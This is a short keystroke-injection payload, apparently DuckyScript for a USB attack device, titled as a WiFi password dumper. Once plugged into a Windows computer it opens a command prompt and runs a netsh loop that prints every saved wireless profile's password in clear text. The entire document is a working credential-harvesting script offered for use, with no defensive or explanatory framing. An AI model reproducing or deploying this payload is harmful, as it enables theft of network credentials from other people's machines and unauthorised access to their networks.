REM GhostBox — WiFi Password Dumper
REM Dumps all saved WiFi passwords

DELAY 1000
GUI r
DELAY 600
STRING cmd /k "for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | findstr -i ssid: key: name: && echo."
ENTER
